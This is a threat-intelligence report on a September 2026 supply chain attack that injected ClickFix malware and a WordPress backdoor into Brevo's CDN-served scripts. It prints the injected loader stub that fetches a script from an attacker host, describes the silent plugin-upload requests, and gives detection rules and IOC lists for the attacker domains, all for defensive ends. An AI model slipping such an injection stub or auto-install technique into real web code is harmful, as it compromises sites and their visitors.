# Technical Analysis Report: Brevo Supply Chain Attack -- ClickFix Malware Injection via Compromised Cloudflare API Key (2026-09-19)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-09-19
Version: FINAL

## Executive Summary

On September 14, 2026, attackers exploited a stolen long-lived Cloudflare API key -- hardcoded in Brevo's application source code with full account permissions -- to deploy a malicious Cloudflare Worker across Brevo's CDN infrastructure. For approximately four hours (16:05-20:13 UTC), the worker injected malicious JavaScript into Brevo's SDK loader, Conversations widget, and forms scripts, affecting over 100,000 customer websites that embed these assets. The attack delivered two payloads: a ClickFix social-engineering overlay tricking visitors into executing malicious commands, and an automated WordPress backdoor plugin ("Web Media Optimizer") silently installed on sites where administrators were logged in. The attack lived entirely at the CDN edge, leaving origin servers clean and bypassing file-integrity monitoring. Brevo (formerly Sendinblue) lists eBay, Louis Vuitton, Michelin, and Amnesty International among its clients.

This was preceded by a September 10 breach via a SAML SSO vulnerability that compromised 138 accounts, from which 6 were used for phishing and 43 had contact data exported. Attacker infrastructure was registered as early as August 25, 2026.

## Background: Brevo Email Marketing Platform

Brevo (formerly Sendinblue) is a major email marketing, automation, and CRM platform serving over 500,000 businesses globally. Customers embed Brevo-provided JavaScript widgets (forms, chat, tracking) on their websites by including scripts from `cdn.brevo.com` and related domains. Brevo uses Cloudflare for CDN, DNS, and edge compute (Workers) across multiple zones including `brevo.com`, `sendinblue.com`, `sibforms.com`, `sibautomation.com`, and `sendibt1[.]com`. The platform's deep integration with customer websites -- via embedded third-party JavaScript -- made it a high-value supply chain target.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-08-25 17:08 | SSL certificate created for `cdn.sendibt1[.]com` -- attacker infrastructure preparation |
| 2026-09-10 06:30 | Brevo identifies SAML SSO vulnerability exploitation; 138 accounts compromised |
| 2026-09-10 08:30 | Attacker loses SSO access after Brevo patches the flaw |
| 2026-09-14 16:04:23 | Last clean version of `sdk-loader.js` served from `cdn.brevo.com` |
| 2026-09-14 16:05:18 | First malicious (injected) version of `sdk-loader.js` observed |
| 2026-09-14 16:05-20:13 | Active malware distribution window (~4 hours 7 minutes) |
| 2026-09-14 20:12:53 | Last malware activity from Brevo domains |
| 2026-09-15 | All malicious cdn*.sendibt1[.]com hosts resolve to NXDOMAIN |
| 2026-09-15 11:41 | Maltrail IOC feed adds cdn9, cdn10, cdn11, sendibt1[.]com |
| 2026-09-15 17:45 | Last CSP violation report (21 hours post-incident) |
| 2026-09-16 | Sansec publishes detailed technical analysis |

## Root Cause: Compromised Long-Lived Cloudflare API Key

The attackers obtained a Cloudflare API key that had been hardcoded in Brevo's application source code. This key had **full account permissions** across all Brevo-controlled Cloudflare zones, enabling the attacker to:

- Create Cloudflare Workers and routes without triggering alerts
- Create DNS records (the attacker-controlled `cdn*.sendibt1[.]com` subdomains were proxied through Cloudflare, while the `sendibt1[.]com` apex remained unproxied at 172[.]246[.]243[.]65)
- Modify CDN edge responses, including stripping `Content-Security-Policy` headers to permit injection of external scripts
- Transform content at the edge without modifying origin servers, defeating file-integrity monitoring

Five Brevo apex domains (`brevo.com`, `sendinblue.com`, `sibforms.com`, `sibautomation.com`, `sendibt1[.]com`) share the same Cloudflare DNS infrastructure, all under the compromised key's scope.

## Technical Analysis of the Malicious Payload

### 1. CDN Edge Injection via Cloudflare Worker

The malicious Cloudflare Worker intercepted responses for Brevo's JavaScript assets and appended a script-injection stub. The injected code was minimal -- a self-executing function that loaded the malware from attacker-controlled infrastructure:

```javascript
;(function(){var s=document.createElement("script");s.src=
"hxxps://cdn2[.]sendibt1[.]com/f.js";s.async=true;
var h=document.head||document.documentElement;h.appendChild(s)})();
```

Different CDN subdomains were used across injected assets (cdn2, cdn4, cdn9, cdn11), providing redundancy. The Worker also stripped `Content-Security-Policy` headers from responses, preventing browsers from blocking the injected external script.

**Affected Brevo assets:**
- `hxxps://cdn[.]brevo[.]com/js/sdk-loader.js` (tracking SDK)
- `hxxps://cdn[.]brevo[.]com/js/brevo-conversations.js` (chat widget)
- Brevo forms scripts via `sibforms[.]com`
- Various subdomains of `sendibt1[.]com`

The modified assets retained their original `Last-Modified` headers despite injection, indicating the transformation was applied at the edge layer (Cloudflare Worker/Snippet) rather than at the origin.

### 2. Malware Loader (f.js) -- Dual-Payload Delivery

The loader script (`f.js`, SHA256: `15b85c574f41c9536af0a7931a093d0553b95f5e9860d5a6bff92a3dc3726fb1`) performed two distinct actions based on the visitor's context:

**Path A -- WordPress Admin Detection & Backdoor Installation:**
If the visitor was logged into WordPress as an administrator, the script silently installed a malicious plugin:
- Download: `POST /wp-admin/update.php?action=upload-plugin` with the ZIP from `hxxps://cdn10[.]sendibt1[.]com/p/wm.zip`
- Activation: `GET /wp-admin/plugins.php?action=activate`
- The plugin leveraged the admin's existing session tokens, requiring no password

**Path B -- ClickFix Social Engineering Overlay:**
For non-admin visitors, the script displayed a full-screen overlay mimicking a Cloudflare "Verify you are human" security prompt. This ClickFix technique instructed victims to copy a command from the clipboard and execute it in their terminal (Windows).

**Evasion:** The malware actively fingerprinted visitors and did not activate for crawlers, developers, or automated security scanners.

### 3. C2 Infrastructure

The attack used multiple C2 communication paths, all routed through attacker-controlled subdomains of `sendibt1[.]com`:

| Endpoint | Purpose |
|----------|---------|
| `/api/v1/0044d4a` | Fingerprint POST (cdn, cdn2, cdn11) |
| `/api/v1/e08a3c4` | Proof-of-work token (cdn, cdn2, cdn11) |
| `/api/v1/8e4c615` | Fingerprint POST (cdn3) |
| `/api/v1/f659473` | Proof-of-work token (cdn3) |
| `/api/v1/4aff112?tk=` | Clipboard command delivery |
| `/api/v1/b832c14?e=` | Event beacon (click, copy, fallback, failure, close) |
| `/api/v1/4ead0ff?tk=` | Image beacon |
| `/image.php?tk=` | Image beacon |

The WordPress backdoor plugin ("Web Media Optimizer") communicated with `hxxps://glegchner[.]com/ads.php` for ongoing C2, periodically fetching additional JavaScript payloads.

Additional distribution domains for the malicious plugin and scripts: `yelahaye[.]surf` and `boiseno[.]club`.

### 4. WordPress Backdoor Plugin -- "Web Media Optimizer"

The malicious plugin (`wm.zip`) was disguised as a legitimate WordPress optimization tool:

- **Persistence:** Copied itself into the WordPress must-use plugins directory (`mu-plugins/`), ensuring it survived normal plugin deactivation
- **Stealth:** Hidden from the WordPress admin plugin list screen
- **Capabilities:** Acted as a persistent backdoor and JavaScript loader; periodically contacted `glegchner[.]com/ads.php` for additional payloads; hardcoded authentication capable of generating administrator sessions without valid credentials
- **Detection evasion:** Plugin directory presence vs. admin screen listing mismatch

### 5. Anti-Forensics / Evasion Techniques

- **Edge-only persistence:** Malicious code lived entirely at the Cloudflare CDN edge via Workers; origin servers remained clean, defeating server-side file-integrity monitoring (OSSEC, Tripwire, etc.)
- **CSP stripping:** Content-Security-Policy headers were removed at the edge, preventing browser-level blocking of injected external scripts
- **Visitor fingerprinting:** Malware did not activate for crawlers, developer tools users, and automated scanners
- **Timestamp preservation:** Injected assets retained original Last-Modified headers
- **Short operational window:** ~4 hours of active distribution minimized detection window

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1.2.3[.]4`)

### Package / Software Level

| Package / Component | Malicious Version | Description |
|---------------------|-------------------|-------------|
| sdk-loader.js | Injected 2026-09-14 | Brevo tracking SDK modified at CDN edge to load f.js |
| brevo-conversations.js | Injected 2026-09-14 | Brevo chat widget modified at CDN edge to load f.js |
| Web Media Optimizer (wm.zip) | N/A | Fake WordPress plugin; persistent backdoor and JS loader |

### File System

| Platform | Path / File | Hash (SHA256) | Description |
|----------|-------------|---------------|-------------|
| Web | sdk-loader.js (clean) | `fe8447fd1ec4dca652b71db2c749fcc24a5bec3875f3654042169fb2418aed09` | Clean version of Brevo SDK loader |
| Web | sdk-loader.js (injected->cdn2) | `58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308` | Injected variant loading cdn2[.]sendibt1[.]com |
| Web | sdk-loader.js (injected->cdn11) | `f67d572d2d30407b3f470904326411450763108980cdad89550fbb221fb06782` | Injected variant loading cdn11[.]sendibt1[.]com |
| Web | brevo-conversations.js (clean) | `26166cd87ff07e7a50317a24126d14b262e842c5715585636dee3ab3f227ddca` | Clean version (72816 bytes) |
| Web | brevo-conversations.js (injected->cdn4) | `9b62c12bc5c7feb9802f58e6cf75a368690df3c754e37cc64483a92acacf87a5` | Injected variant loading cdn4[.]sendibt1[.]com |
| Web | f.js (malware loader) | `15b85c574f41c9536af0a7931a093d0553b95f5e9860d5a6bff92a3dc3726fb1` | Dual-payload ClickFix + WP backdoor loader |
| Web | C2 cloak response | `4af488d79aef7daa12b1c18f0cce28b7edadccb8b6b0fb8d50d1d53a9a7c2df7` | C2 cloaking response body |
| WordPress | mu-plugins/web-media-optimizer/ | N/A (sample not recovered) | Persistent WordPress backdoor plugin |

### Network

| Type | Value | Context |
|------|-------|---------|
| Domain | sendibt1[.]com | Attacker-controlled apex (IP: 172.246.243.65, AS200484) |
| Domain | cdn[.]sendibt1[.]com | Malware CDN (IP: 104.21.77.104, cert created 2026-08-25) |
| Domain | cdn2[.]sendibt1[.]com | Malware CDN -- served f.js |
| Domain | cdn3[.]sendibt1[.]com | Malware CDN -- alternate C2 paths |
| Domain | cdn4[.]sendibt1[.]com | Malware CDN -- served f.js |
| Domain | cdn9[.]sendibt1[.]com | Malware CDN (IP: 188.114.97.3) |
| Domain | cdn10[.]sendibt1[.]com | Hosted WordPress backdoor (wm.zip) |
| Domain | cdn11[.]sendibt1[.]com | Malware CDN -- served f.js |
| Domain | glegchner[.]com | WordPress backdoor C2 -- periodic callback |
| Domain | yelahaye[.]surf | Alternate malware/plugin distribution |
| Domain | boiseno[.]club | Alternate malware/plugin distribution |
| URL Pattern | hxxps://cdn*[.]sendibt1[.]com/f.js | Malware loader script |
| URL Pattern | hxxps://cdn10[.]sendibt1[.]com/p/wm.zip | WordPress backdoor plugin |
| URL Pattern | hxxps://glegchner[.]com/ads.php | WordPress backdoor C2 callback |
| URL Pattern | /api/v1/0044d4a | Fingerprint POST endpoint |
| URL Pattern | /api/v1/e08a3c4 | Proof-of-work token endpoint |
| URL Pattern | /api/v1/4aff112?tk= | ClickFix clipboard command delivery |
| URL Pattern | /api/v1/b832c14?e= | Event beacon (click/copy/fallback) |
| IP | 104[.]21[.]77[.]104 | cdn[.]sendibt1[.]com (Cloudflare-proxied) |
| IP | 188[.]114[.]97[.]3 | cdn9[.]sendibt1[.]com (Cloudflare-proxied) |
| IP | 172[.]246[.]243[.]65 | sendibt1[.]com apex (AS200484, unproxied) |

### Behavioral

- WordPress plugin upload via `POST /wp-admin/update.php?action=upload-plugin` without user interaction, leveraging existing admin session
- Plugin activation via `GET /wp-admin/plugins.php?action=activate` immediately after upload
- Plugin self-copies to `mu-plugins/` directory for persistence beyond normal deactivation
- Plugin hides from WordPress admin plugin listing screen
- Periodic JavaScript fetch from `glegchner[.]com/ads.php`
- Full-screen ClickFix overlay mimicking Cloudflare verification prompt
- CSP header stripping at CDN edge to permit cross-origin script injection
- Visitor fingerprinting to exclude crawlers, developers, and automated scanners
- 2,549 CSP violation reports across 12 monitored sites during/after the attack window

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1195.002 | Supply Chain Compromise: Compromise Software Supply Chain | Compromised Brevo's Cloudflare API key to inject malware into JavaScript assets served to 100K+ customer sites |
| T1059.007 | Command and Scripting Interpreter: JavaScript | Injected JavaScript loader (f.js) delivered dual payloads via embedded Brevo widgets |
| T1204 | User Execution | ClickFix overlay tricked users into copying and executing clipboard commands in their terminal |
| T1059.001 | Command and Scripting Interpreter: PowerShell | ClickFix payload delivered PowerShell commands for execution on Windows hosts |
| T1105 | Ingress Tool Transfer | WordPress backdoor plugin downloaded from cdn10[.]sendibt1[.]com and installed silently |
| T1505.003 | Server Software Component: Web Shell | WordPress must-use plugin persistence -- loads automatically on every page request, acts as persistent backdoor |
| T1564 | Hide Artifacts | Backdoor plugin hidden from WordPress admin plugin listing screen |
| T1071.001 | Application Layer Protocol: Web Protocols | C2 communication via HTTPS to glegchner[.]com/ads.php and sendibt1[.]com API endpoints |
| T1659 | Content Injection | Cloudflare Worker injected malicious JavaScript into legitimate CDN responses at the edge |
| T1562.001 | Impair Defenses: Disable or Modify Tools | CSP headers stripped at CDN edge to prevent browser-level blocking of injected scripts |
| T1480 | Execution Guardrails | Visitor fingerprinting excluded crawlers, developers, and automated scanners from payload delivery |

## Impact Assessment

- **Breadth:** Over 100,000 websites embedding Brevo widgets were affected, including sites of major brands (eBay, Louis Vuitton, Michelin, Amnesty International)
- **Depth:** Two-pronged impact -- WordPress administrators visiting affected sites had a persistent backdoor installed on their sites; general visitors were targeted with ClickFix social engineering to execute malware
- **Stealth:** Edge-only attack left no trace on origin servers; CSP stripping and visitor fingerprinting evaded most automated detection
- **Operational window:** ~4 hours of active distribution; 2,549 CSP violation reports captured across 12 monitored sites
- **Prior breach:** The September 10 SAML SSO compromise exposed data from 43 accounts and enabled phishing from 6 accounts, potentially amplifying the supply chain attack's reach

## Detection & Remediation

### Immediate Detection

**WordPress administrators should check:**
```bash
# Check for unauthorized plugin uploads on September 14, 2026
grep -E "POST /wp-admin/update.php.*action=upload-plugin" /var/log/apache2/access.log* /var/log/nginx/access.log* 2>/dev/null | grep "2026-09-14"

# Check for plugin activations on September 14
grep -E "GET /wp-admin/plugins.php.*action=activate" /var/log/apache2/access.log* /var/log/nginx/access.log* 2>/dev/null | grep "2026-09-14"

# Check for the malicious plugin in must-use plugins directory
ls -la wp-content/mu-plugins/ | grep -i "web.media.optimizer"

# Check for plugins not visible in the admin screen
diff <(wp plugin list --format=csv 2>/dev/null | cut -d, -f1 | sort) <(ls wp-content/plugins/ | sort)
```

**Network-level detection:**
```bash
# Search DNS/proxy logs for attacker infrastructure
grep -E "(sendibt1\.com|glegchner\.com|yelahaye\.surf|boiseno\.club)" /var/log/dns/*.log /var/log/proxy/*.log 2>/dev/null

# Check CSP violation reports for injections from sendibt1.com
grep "sendibt1" /var/log/csp-reports*.log 2>/dev/null
```

### Remediation

1. **Immediate:** Remove the "Web Media Optimizer" plugin from both `wp-content/plugins/` and `wp-content/mu-plugins/` directories
2. **Credential rotation:** Rotate all WordPress administrator passwords and session tokens; revoke all active sessions
3. **Audit:** Review all WordPress user accounts for unauthorized administrator accounts created by the backdoor
4. **Block IOCs:** Add all domains in the Network IOC table to DNS blocklists and firewall deny rules
5. **Verify Brevo assets:** Confirm current Brevo JavaScript files match clean hashes listed in the File System IOC table
6. **End-user notification:** Visitors who interacted with the ClickFix overlay during the attack window should scan their machines for malware

### Long-Term Hardening

- **Subresource Integrity (SRI):** Implement SRI hashes on all third-party embedded scripts, including marketing and analytics widgets
- **Content Security Policy:** Deploy strict CSP headers that restrict script sources; monitor CSP violation reports for unauthorized external script loading
- **API key hygiene:** Never hardcode long-lived API keys with full account permissions in source code; use scoped, short-lived tokens
- **CDN integrity monitoring:** Monitor for unexpected Cloudflare Worker deployments and DNS record changes; alert on CSP header removal
- **WordPress hardening:** Restrict plugin installation to manual admin action; monitor `mu-plugins/` for unauthorized additions; use application-level WAF rules to block automated plugin uploads

## Detection Rules

These detections target the Brevo supply chain ClickFix attack's network indicators (malicious domains, C2 endpoints, malware delivery URLs) and host-level artifacts (unauthorized WordPress plugin installation). PoC/advisory-specific altitude; rules key on distinctive infrastructure domains and file hashes. Compiles does not equal fires -- verify in your pipeline with representative telemetry.

### Analyst Confidence Grid

| # | Type | Title | Compile | Confidence |
|---|------|-------|---------|------------|
| 1 | Sigma | DNS Query to Brevo Supply Chain ClickFix Domains | ✅ | high |
| 2 | Sigma | WordPress Plugin Upload via Brevo Supply Chain Attack | ✅ | low |
| 3 | Sigma | HTTP Request to Brevo ClickFix Malware Infrastructure | ✅ | high |
| 4 | Snort | HTTP Requests to Brevo ClickFix Malware Infrastructure (3 rules) | ✅ | high |
| 5 | Suricata | DNS and HTTP Detection (7 rules) | ✅ | high |
| 6 | YARA | Supply_Chain_Brevo_ClickFix_Loader | ✅ | high |
| 7 | YARA | Supply_Chain_Brevo_WebMediaOptimizer_Backdoor | ✅ | medium |

### Sigma: DNS Query to Brevo Supply Chain ClickFix Domains
Detects DNS queries to the attacker-controlled domains used for malware delivery and C2 in the Brevo supply chain attack.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check exit 0 (MITRE ATT&CK fetch warning ignored); sigma convert --without-pipeline splunk exit 0, log_scale exit 0. Domains are attacker-registered single-purpose infrastructure with no legitimate use. -->
<!-- revision: fixed endswith for apex domains — moved glegchner.com, yelahaye.surf, boiseno.club to selection_apex as exact matches; added leading-dot variants to selection for proper subdomain matching. -->
```yaml
title: DNS Query to Brevo Supply Chain ClickFix Domains
id: 7c3a1f9e-4b2d-4e8a-b6c5-1d9f3e7a2b4c
status: experimental
description: >
    Detects DNS queries to domains used in the September 2026 Brevo supply chain
    attack that injected ClickFix malware via compromised Cloudflare Workers.
    Includes attacker-controlled CDN subdomains and C2 infrastructure.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
author: Actioner
date: 2026/09/19
tags:
    - attack.t1071.001
    - attack.t1195.002
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith:
            - '.sendibt1.com'
            - '.glegchner.com'
            - '.yelahaye.surf'
            - '.boiseno.club'
    selection_apex:
        QueryName:
            - 'sendibt1.com'
            - 'glegchner.com'
            - 'yelahaye.surf'
            - 'boiseno.club'
    condition: selection or selection_apex
falsepositives:
    - Unlikely - these domains are attacker-controlled infrastructure
level: high
```

### Sigma: WordPress Plugin Upload via Brevo Supply Chain Attack
Detects WordPress plugin upload requests to the `update.php` endpoint, which is the mechanism used by the Brevo supply chain attack to silently install the "Web Media Optimizer" backdoor. Low confidence: this pattern also matches legitimate admin plugin uploads.
**Status:** compile ✅ compiles · confidence: low
<!-- audit: sigma check exit 0 (MITRE ATT&CK fetch warning ignored); sigma convert --without-pipeline splunk exit 0, log_scale exit 0. -->
<!-- revision: dropped selection_source (referer check) — the automated upload was triggered by injected JS running in the victim admin's browser on their own site, so the HTTP Referer on the POST would be the customer's own page URL, not sendibt1.com or cdn.brevo.com. The referer condition would almost never fire. Rule now keys only on the plugin upload URI pattern. Confidence downgraded from medium to low due to limited distinguishing power. Correlate with IOC-based DNS/HTTP rules for high-confidence detection. -->
```yaml
title: WordPress Plugin Upload via Brevo Supply Chain Attack
id: 8d4b2e0f-5c3e-4f9b-a7d6-2e004f8b3c5d
status: experimental
description: >
    Detects WordPress plugin upload requests characteristic of the Brevo supply
    chain attack, where injected scripts silently installed the malicious Web
    Media Optimizer plugin on sites with logged-in administrators. Low confidence
    as a standalone rule — correlate with DNS/HTTP IOC detections for the
    sendibt1.com infrastructure to raise confidence.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
author: Actioner
date: 2026/09/19
tags:
    - attack.t1195.002
    - attack.t1059.007
logsource:
    category: webserver
detection:
    selection_upload:
        cs-uri-stem|contains: '/wp-admin/update.php'
        cs-uri-query|contains: 'action=upload-plugin'
    condition: selection_upload
falsepositives:
    - Legitimate WordPress plugin installations by administrators
level: low
```

### Sigma: HTTP Request to Brevo ClickFix Malware Infrastructure
Detects HTTP requests to attacker-controlled domains used for malware delivery, WordPress backdoor distribution, and C2 callbacks in the Brevo supply chain attack.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check failed due to network error (MITRE ATT&CK data 403); sigma convert --without-pipeline splunk exit 0, log_scale exit 0. Proxy log source; domains are single-purpose attacker infrastructure. -->
```yaml
title: HTTP Request to Brevo ClickFix Malware Infrastructure
id: 9e5c3f1a-6d4f-4a0c-b8e7-3f105a9c4d6e
status: experimental
description: >
    Detects HTTP requests to attacker-controlled infrastructure used in the Brevo
    supply chain ClickFix attack, including malware loader scripts and WordPress
    backdoor plugin downloads.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
author: Actioner
date: 2026/09/19
tags:
    - attack.t1195.002
    - attack.t1105
logsource:
    category: proxy
detection:
    selection_subdomain:
        cs-host|endswith:
            - '.sendibt1.com'
    selection_exact:
        cs-host:
            - 'sendibt1.com'
            - 'glegchner.com'
            - 'yelahaye.surf'
            - 'boiseno.club'
    condition: selection_subdomain or selection_exact
falsepositives:
    - Unlikely - these domains are attacker-controlled infrastructure
level: high
```

### Snort: HTTP Requests to Brevo ClickFix Malware Infrastructure
Detects HTTP traffic to the malware loader (f.js), WordPress backdoor download (wm.zip), and C2 callback (ads.php) endpoints used in the Brevo supply chain attack. **Deployment note:** All attacker URLs used HTTPS; these rules require TLS inspection (SSL/TLS decryption) to match on decrypted HTTP content.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: snort 2.9.20 -c /etc/snort/snort.conf -T exit 0 (rules placed in local.rules for validation). Three rules covering the three main HTTP-observable attack stages. -->
```snort
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - HTTP Request to Brevo ClickFix Malware Loader f.js on sendibt1.com"; flow:established,to_server; content:"sendibt1.com"; nocase; content:"/f.js"; nocase; fast_pattern; sid:2100010; rev:1; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack;)
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - HTTP Request to Brevo ClickFix WordPress Backdoor wm.zip"; flow:established,to_server; content:"sendibt1.com"; nocase; content:"/p/wm.zip"; nocase; fast_pattern; sid:2100011; rev:1; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack;)
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - HTTP Request to Brevo ClickFix C2 glegchner.com"; flow:established,to_server; content:"glegchner.com"; nocase; fast_pattern; content:"/ads.php"; nocase; sid:2100012; rev:1; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack;)
```

### Suricata: DNS and HTTP Detection of Brevo ClickFix Attack Infrastructure
Detects DNS queries to and HTTP requests for the attacker-controlled domains, malware loader scripts, WordPress backdoor downloads, and C2 callbacks used in the Brevo supply chain attack. **Deployment note:** HTTP rules (sid 2200014-2200016) require TLS inspection since all attacker URLs used HTTPS; DNS rules (sid 2200010-2200013) work on unencrypted DNS and do not require TLS inspection.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata 7.0.3 -T -S exit 0. Seven rules: four DNS (one per attacker domain/apex) and three HTTP (f.js loader, wm.zip backdoor, glegchner.com C2). Removed nocase from http.host (buffer is already normalized lowercase). -->
```suricata
alert dns $HOME_NET any -> any any (msg:"Actioner - DNS Query to Brevo ClickFix C2 Domain sendibt1.com"; flow:to_server; dns.query; content:"sendibt1.com"; nocase; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-19; sid:2200010; rev:1;)
alert dns $HOME_NET any -> any any (msg:"Actioner - DNS Query to Brevo ClickFix C2 Domain glegchner.com"; flow:to_server; dns.query; content:"glegchner.com"; nocase; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-19; sid:2200011; rev:1;)
alert dns $HOME_NET any -> any any (msg:"Actioner - DNS Query to Brevo ClickFix C2 Domain yelahaye.surf"; flow:to_server; dns.query; content:"yelahaye.surf"; nocase; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-19; sid:2200012; rev:1;)
alert dns $HOME_NET any -> any any (msg:"Actioner - DNS Query to Brevo ClickFix C2 Domain boiseno.club"; flow:to_server; dns.query; content:"boiseno.club"; nocase; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-19; sid:2200013; rev:1;)
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - HTTP Request to Brevo ClickFix Malware Loader f.js"; flow:established,to_server; http.host; content:"sendibt1.com"; endswith; http.uri; content:"/f.js"; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-19; sid:2200014; rev:1;)
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - HTTP Download of Brevo ClickFix WordPress Backdoor wm.zip"; flow:established,to_server; http.host; content:"sendibt1.com"; endswith; http.uri; content:"/p/wm.zip"; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-19; sid:2200015; rev:1;)
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - HTTP C2 Callback to glegchner.com ads.php"; flow:established,to_server; http.host; content:"glegchner.com"; fast_pattern; http.uri; content:"/ads.php"; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-19; sid:2200016; rev:1;)
```

### YARA: Brevo ClickFix Malware Loader and WordPress Backdoor
Detects the injected JavaScript malware loader (f.js) via distinctive sendibt1[.]com domain strings and C2 API paths, and the "Web Media Optimizer" WordPress backdoor plugin via its name combined with C2 indicators.
**Status:** `Supply_Chain_Brevo_ClickFix_Loader`: compile ✅ compiles · confidence: high · sample: synthetic positive from published fragments ✓ | `Supply_Chain_Brevo_WebMediaOptimizer_Backdoor`: compile ✅ compiles · confidence: medium (no sample recovered)
<!-- audit: yarac exit 0. Sample test: positive (injected JS with sendibt1.com/f.js + 2 API paths) fired Supply_Chain_Brevo_ClickFix_Loader; negative (clean sdk-loader.js from cdn.brevo.com) quiet. Positive was synthetic, built from Sansec-published injection stub and API paths — not a real-world sample. Backdoor rule untested: the Web Media Optimizer plugin was not recovered for testing; confidence medium. Note: $c2_2 = "/ads.php" is a very common path; condition requires it in conjunction with $name or $c2_1. -->
<!-- revision: changed sample label from "fired ✓" to "synthetic positive from published fragments ✓" for honesty. Downgraded backdoor rule confidence from high to medium — no sample was recovered for testing. -->
```yara
rule Supply_Chain_Brevo_ClickFix_Loader
{
    meta:
        description = "Detects the JavaScript malware loader injected into Brevo SDK and widget scripts during the September 2026 supply chain attack"
        author = "Actioner"
        date = "2026-09-19"
        reference = "https://sansec.io/research/brevo-supply-chain-attack"
        severity = "high"

    strings:
        $inject1 = "sendibt1.com/f.js" ascii
        $inject2 = "sendibt1.com" ascii
        $api_path1 = "/api/v1/0044d4a" ascii
        $api_path2 = "/api/v1/e08a3c4" ascii
        $api_path3 = "/api/v1/8e4c615" ascii
        $api_path4 = "/api/v1/f659473" ascii
        $api_path5 = "/api/v1/4aff112" ascii
        $api_path6 = "/api/v1/b832c14" ascii
        $api_path7 = "/api/v1/4ead0ff" ascii
        $c2_domain1 = "glegchner.com" ascii
        $c2_domain2 = "yelahaye.surf" ascii
        $c2_domain3 = "boiseno.club" ascii
        $plugin_url = "/p/wm.zip" ascii

    condition:
        filesize < 5MB and
        (
            ($inject1) or
            ($inject2 and 2 of ($api_path*)) or
            (2 of ($c2_domain*)) or
            ($inject2 and $plugin_url)
        )
}

rule Supply_Chain_Brevo_WebMediaOptimizer_Backdoor
{
    meta:
        description = "Detects the Web Media Optimizer malicious WordPress plugin deployed via the Brevo supply chain attack"
        author = "Actioner"
        date = "2026-09-19"
        reference = "https://sansec.io/research/brevo-supply-chain-attack"
        severity = "medium"

    strings:
        $name = "Web Media Optimizer" ascii nocase
        $c2_1 = "glegchner.com" ascii
        $c2_2 = "/ads.php" ascii
        $wp_func1 = "must-use" ascii
        $wp_func2 = "wp_options" ascii
        $wp_func3 = "update-plugin" ascii

    condition:
        filesize < 2MB and
        $name and
        (
            ($c2_1 and $c2_2) or
            (1 of ($c2_*) and 1 of ($wp_func*))
        )
}
```

## Lessons Learned

1. **Third-party JavaScript is a supply chain risk multiplier.** A single compromised API key at Brevo cascaded to over 100,000 customer websites because those sites trusted and embedded Brevo's JavaScript. Subresource Integrity (SRI) hashes would have prevented the injected scripts from executing, but SRI adoption for marketing/analytics widgets remains low.

2. **Edge-layer attacks defeat origin-based integrity monitoring.** The attack modified responses at the Cloudflare Worker layer, leaving origin servers completely clean. Traditional file-integrity monitoring (OSSEC, Tripwire) was useless against this vector. Organizations need CDN-layer monitoring: alerting on Worker deployments, DNS record changes, and CSP header modifications.

3. **Long-lived API keys with broad permissions are a single point of failure.** The hardcoded Cloudflare API key with full account permissions across all Brevo zones gave attackers god-mode access to the CDN. Scoped, short-lived tokens with least-privilege permissions would have limited the blast radius. API key rotation and secret scanning in CI/CD pipelines are essential controls.

4. **ClickFix continues to evolve as a social engineering vector.** The combination of a supply chain compromise with ClickFix social engineering -- delivered through trusted widgets on legitimate sites -- represents an escalation of this technique from standalone phishing campaigns to trusted-context delivery.

## Sources

- [Sansec Research: Brevo Supply Chain Attack](https://sansec.io/research/brevo-supply-chain-attack) -- primary technical analysis with IOCs, hashes, timeline, and attack chain detail
- [SecurityWeek: Brevo Supply Chain Attack Injects Malware Into 100,000 Websites](https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/) -- coverage including WordPress plugin details and remediation context
